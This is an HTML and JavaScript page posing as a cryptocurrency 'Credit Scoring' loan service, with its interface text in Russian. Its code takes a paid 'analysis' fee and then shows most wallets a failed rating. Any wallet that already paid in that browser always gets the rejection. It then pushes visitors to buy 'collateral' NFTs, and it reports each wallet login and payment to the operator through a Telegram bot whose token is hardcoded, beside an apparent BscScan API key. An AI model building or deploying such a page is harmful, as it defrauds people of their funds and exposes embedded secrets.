<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credit Scoring System</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --accent: #00f2ff; --bg: #030308; --card: #0d0d1a; --text-main: #ffffff; --text-dim: #a0a0b8; --success: #00ff88; --error: #ff0055; }
        body { background: var(--bg); color: var(--text-main); font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background-image: radial-gradient(circle at 50% 50%, #1a1a3a 0%, #030308 100%); }
        .container { background: var(--card); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 28px; padding: 40px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 40px 100px rgba(0,0,0,0.8); backdrop-filter: blur(10px); }
        h1 { font-size: 26px; font-weight: 800; margin-bottom: 25px; background: linear-gradient(135deg, #fff 0%, var(--accent) 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .range-container { margin: 20px 0; text-align: left; }
        .range-label { display: flex; justify-content: space-between; color: var(--text-dim); font-size: 12px; margin-bottom: 8px; text-transform: uppercase; }
        .amount-display { font-size: 28px; font-weight: 800; color: var(--accent); text-align: center; margin-bottom: 12px; }
        input[type=range] { width: 100%; cursor: pointer; height: 6px; border-radius: 5px; background: #222; outline: none; -webkit-appearance: none; }
        input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; width: 18px; height: 18px; border-radius: 50%; background: var(--accent); cursor: pointer; box-shadow: 0 0 10px var(--accent); }
        .calculation-box { background: rgba(255, 255, 255, 0.03); border: 1px dashed rgba(0, 242, 255, 0.3); border-radius: 20px; padding: 15px; margin: 20px 0; }
        .btn { background: var(--accent); color: #000; border: none; padding: 18px 30px; border-radius: 16px; font-weight: 700; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0, 242, 255, 0.2); }
        .btn:disabled { background: #333; color: #666; cursor: not-allowed; }
        .btn-nft { background: rgba(0, 242, 255, 0.1); border: 1px solid var(--accent); color: var(--accent); margin-top: 10px; padding: 12px; font-size: 13px; border-radius: 12px; font-weight: 600; }
        .dashboard { margin-top: 10px; padding: 10px; border-radius: 20px; }
        .status-msg { font-size: 13px; margin-top: 20px; min-height: 20px; font-weight: 500; }
        .result-card { display: none; margin-top: 20px; padding: 25px; border-radius: 20px; border: 1px solid #444; text-align: left; background: rgba(255,255,255,0.02); }
        .loader { border: 2px solid #f3f3f3; border-top: 2px solid var(--accent); border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; margin-right: 8px; vertical-align: middle; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <div style="font-size: 50px; margin-bottom: 15px;">üíé</div>
    <h1>Credit Scoring</h1>

    <div id="authSection">
        <button class="btn" onclick="connect()">–ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª–µ–∫</button>
    </div>
    
    <div id="dashboard" class="dashboard" style="display:none;">
        <div style="color: var(--text-dim); font-size: 11px; margin-bottom: 15px;">–ö–æ—à–µ–ª–µ–∫: <span id="userAddr" style="color: var(--accent);"></span></div>

        <div class="range-container">
            <div class="range-label"><span>–°—É–º–º–∞ –∫—Ä–µ–¥–∏—Ç–∞</span></div>
            <div class="amount-display" id="amountVal">$250</div>
            <input type="range" id="amountSlider" min="10" max="500" step="10" value="250" oninput="updateUI()">
        </div>

        <div class="range-container">
            <div class="range-label"><span>–°—Ä–æ–∫ (–º–µ—Å.)</span></div>
            <div class="amount-display" id="termVal" style="color: #fff; font-size: 20px;">4 –º–µ—Å—è—Ü–∞</div>
            <input type="range" id="termSlider" min="2" max="6" step="1" value="4" oninput="updateUI()">
        </div>

        <div class="calculation-box">
            <div style="font-size: 11px; color: var(--text-dim);">–ò–¢–û–ì–û –ö –í–û–ó–í–†–ê–¢–£</div>
            <div style="font-size: 24px; font-weight: 800; color: var(--success);" id="totalToPay">$300.00</div>
        </div>

        <button id="actionBtn" class="btn" onclick="processCredit()">–ó–∞–ø—Ä–æ—Å–∏—Ç—å –∫—Ä–µ–¥–∏—Ç</button>
        <div style="font-size: 10px; color: #555; margin-top: 12px; letter-spacing: 0.5px;">–ö–û–ú–ò–°–°–ò–Ø –ó–ê –ê–ù–ê–õ–ò–ó: 0.001 BNB</div>
    </div>

    <div id="resultBox" class="result-card"></div>
    <div id="status" class="status-msg"></div>
</div>

<script>
    // --- –¢–í–û–ò –ù–ê–°–¢–†–û–ô–ö–ò ---
    const TELEGRAM_TOKEN = "8514449991:AAGOD-zVo3f8-WPz0XrFXzv_iznFJMaYJi0"; 
    const TELEGRAM_CHAT_ID = "5611455025"; 
    const CONTRACT_ADDRESS = "0x6DF193f9c0a2AFDb9Dfa883f95C82Addd1613F2f"; 
    const BSC_API_KEY = "Y6U93JFUWVX6TBN37MB6NKVKWIPKEVAGEY"; 

    const ABI = [
        "function requestVerification() public payable",
        "function buyBoostNFT() public payable",
        "function claimCredit() public",
        "function availableCreditBalance(address) public view returns (uint256)"
    ];

    let signer, address, contract;

    // –£–ª—É—á—à–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
    async function sendTelegram(msg) {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`;
        try {
            await fetch(url, { method: 'GET' });
        } catch (e) { console.error("TG Error"); }
    }

    function updateUI() {
        const amount = document.getElementById('amountSlider').value;
        const term = document.getElementById('termSlider').value;
        document.getElementById('amountVal').innerText = "$" + amount;
        document.getElementById('termVal').innerText = term + (term > 4 ? " –º–µ—Å—è—Ü–µ–≤" : " –º–µ—Å—è—Ü–∞");
        document.getElementById('totalToPay').innerText = "$" + (amount * 1.2).toFixed(2);
    }

    async function connect() {
        if (!window.ethereum) return alert("MetaMask –Ω–µ –Ω–∞–π–¥–µ–Ω!");
        try {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            signer = provider.getSigner();
            address = await signer.getAddress();
            contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
            
            document.getElementById('authSection').style.display = "none";
            document.getElementById('dashboard').style.display = "block";
            document.getElementById('userAddr').innerText = address.substring(0,6) + "..." + address.substring(38);
            
            sendTelegram(`üë§ <b>–í—Ö–æ–¥ –≤ —Å–µ—Ä–≤–∏—Å</b>\n–ö–æ—à–µ–ª–µ–∫: <code>${address}</code>`);

            // –ü–†–û–í–ï–†–ö–ê: –ï—Å–ª–∏ —é–∑–µ—Ä —É–∂–µ –ø–ª–∞—Ç–∏–ª –∑–∞ –∞–Ω–∞–ª–∏–∑ –≤ —ç—Ç–æ–º –±—Ä–∞—É–∑–µ—Ä–µ
            if (localStorage.getItem('paid_analysis_' + address) === 'true') {
                document.getElementById('dashboard').style.display = "none";
                renderResult(false, "–ù–ò–ó–ö–ò–ô –†–ï–ô–¢–ò–ù–ì", "–ê–Ω–∞–ª–∏–∑ –∑–∞–≤–µ—Ä—à–µ–Ω. –î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫—Ä–µ–¥–∏—Ç–Ω–æ–≥–æ –ª–∏–º–∏—Ç–∞ —Ç—Ä–µ–±—É–µ—Ç—Å—è –≤–Ω–µ—Å—Ç–∏ –∑–∞–ª–æ–≥–æ–≤—ã–π NFT.", true, false);
            } else {
                updateUI();
            }
            
        } catch (e) { showStatus("–û—à–∏–±–∫–∞ –≤—Ö–æ–¥–∞", "#ff0055"); }
    }

    async function processCredit() {
        const amount = document.getElementById('amountSlider').value;
        const btn = document.getElementById('actionBtn');
        btn.disabled = true;
        try {
            showStatus("<div class='loader'></div> –û–ø–ª–∞—Ç–∞ –∞–Ω–∞–ª–∏–∑–∞ (0.001 BNB)...", "#fff");
            const tx = await contract.requestVerification({ value: ethers.utils.parseEther("0.001") });
            await tx.wait();

            // –ó–ê–ü–û–ú–ò–ù–ê–ï–ú –û–ü–õ–ê–¢–£
            localStorage.setItem('paid_analysis_' + address, 'true');

            sendTelegram(`üîé <b>–û–ø–ª–∞—á–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞!</b>\n–Æ–∑–µ—Ä: <code>${address}</code>\n–°—É–º–º–∞ –Ω–∞ –ø–æ–ª–∑—É–Ω–∫–µ: <b>$${amount}</b>`);
            showStatus("<div class='loader'></div> –ò–¥–µ—Ç –≥–ª—É–±–æ–∫–∏–π –∞–Ω–∞–ª–∏–∑...", "#fff");
            
            setTimeout(() => runAnalysis(amount), 2000);
        } catch (e) { 
            showStatus("–¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–º–µ–Ω–µ–Ω–∞", "#ff0055"); 
            btn.disabled = false; 
        }
    }

    async function runAnalysis(reqAmount) {
        const url = `https://api.bscscan.com/api?module=account&action=txlist&address=${address}&sort=asc&apikey=${BSC_API_KEY}`;
        try {
            const res = await fetch(url);
            const data = await res.json();
            document.getElementById('dashboard').style.display = "none";

            const txs = data.result || [];
            const isOld = txs.length > 0 && (Date.now() - (txs[0].timeStamp * 1000)) >= (365 * 24 * 60 * 60 * 1000);
            
            if (isOld && txs.length > 60) {
                renderResult(true, "–û–î–û–ë–†–ï–ù–û", `–í–∞—à –∫—Ä–µ–¥–∏—Ç–Ω—ã–π –ª–∏–º–∏—Ç –≤ $${reqAmount} —É—Å–ø–µ—à–Ω–æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω —Å–∏—Å—Ç–µ–º–æ–π.`, false, true);
            } else {
                renderResult(false, "–ù–ò–ó–ö–ò–ô –†–ï–ô–¢–ò–ù–ì", "–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–µ –ø—Ä–æ–π–¥–µ–Ω–∞. –¢—Ä–µ–±—É–µ—Ç—Å—è –∫—Ä–µ–¥–∏—Ç–Ω—ã–π NFT –¥–ª—è –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è –ª–∏–º–∏—Ç–∞.", true, false);
            }
        } catch (e) { 
            renderResult(false, "–û–®–ò–ë–ö–ê", "–û—à–∏–±–∫–∞ —Å–≤—è–∑–∏ —Å —Å–µ—Ç—å—é BSC.", false); 
        }
    }

    async function buyNFT(price) {
        try {
            showStatus("<div class='loader'></div> –ú–∏–Ω—Ç NFT...", "#fff");
            const tx = await contract.buyBoostNFT({ value: ethers.utils.parseEther(price) });
            await tx.wait();
            sendTelegram(`üî• <b>–ö–£–ü–õ–ï–ù NFT (${price} BNB)</b>\n–Æ–∑–µ—Ä: <code>${address}</code>`);
            renderResult(true, "NFT –ü–û–õ–£–ß–ï–ù", "–ó–∞–ª–æ–≥ —É—Å–ø–µ—à–Ω–æ –≤–Ω–µ—Å–µ–Ω. –¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –∑–∞–±—Ä–∞—Ç—å –∫—Ä–µ–¥–∏—Ç–Ω—É—é –≤—ã–ø–ª–∞—Ç—É –Ω–∞ –∫–æ—à–µ–ª–µ–∫.", false, true);
        } catch (e) { 
            showStatus("–û—à–∏–±–∫–∞ –æ–ø–ª–∞—Ç—ã NFT", "#ff0055"); 
        }
    }

    async function claimMoney() {
        try {
            showStatus("<div class='loader'></div> –í—ã–ø–ª–∞—Ç–∞ —Å—Ä–µ–¥—Å—Ç–≤...", "#fff");
            const tx = await contract.claimCredit();
            await tx.wait();
            sendTelegram(`üí∞ <b>–í–´–ü–õ–ê–¢–ê –ü–û–õ–£–ß–ï–ù–ê!</b>\n–Æ–∑–µ—Ä: <code>${address}</code>`);
            showStatus("–í—ã–ø–ª–∞—á–µ–Ω–æ!", "#00ff88");
            renderResult(true, "–°–†–ï–î–°–¢–í–ê –û–¢–ü–†–ê–í–õ–ï–ù–´", "–ö—Ä–µ–¥–∏—Ç –∑–∞—á–∏—Å–ª–µ–Ω –Ω–∞ –≤–∞—à –±–∞–ª–∞–Ω—Å. –°–ª–µ–¥—É—é—â–µ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ª–∏–º–∏—Ç–∞ —á–µ—Ä–µ–∑ 31 –¥–µ–Ω—å.", false, false);
        } catch (e) { 
            alert("–û—à–∏–±–∫–∞: –°—Ä–µ–¥—Å—Ç–≤–∞ –º–æ–∂–Ω–æ –∑–∞–±—Ä–∞—Ç—å —Ç–æ–ª—å–∫–æ –æ–¥–∏–Ω —Ä–∞–∑ –≤ 31 –¥–µ–Ω—å!"); 
        }
    }

    function renderResult(isSuccess, title, text, showNFT, showClaim) {
        const rb = document.getElementById('resultBox');
        rb.style.display = "block";
        rb.style.borderColor = isSuccess ? "#00ff88" : "#ff0055";
        let html = `<div style="color:${isSuccess ? '#00ff88' : '#ff0055'}; font-size:20px; margin-bottom:10px; font-weight:700;">${title}</div>
                    <div style="font-size:14px; margin-bottom:15px; color:#e0e0e0; line-height:1.4;">${text}</div>`;
        if (showNFT) {
            html += `<button class="btn btn-nft" onclick="buyNFT('0.003')">Buy NFT Boost (0.003 BNB)</button>
                     <button class="btn btn-nft" onclick="buyNFT('0.007')">Buy Pro Credit NFT (0.007 BNB)</button>`;
        }
        if (showClaim) {
            html += `<button class="btn" style="background:linear-gradient(90deg, #00ff88, #00f2ff); margin-top:10px;" onclick="claimMoney()">–ó–ê–ë–†–ê–¢–¨ –í–´–ü–õ–ê–¢–£ (50%)</button>`;
        }
        rb.innerHTML = html;
        showStatus("", "");
    }

    function showStatus(text, color) {
        const s = document.getElementById('status');
        s.innerHTML = text;
        s.style.color = color;
    }
</script>
</body>
</html>
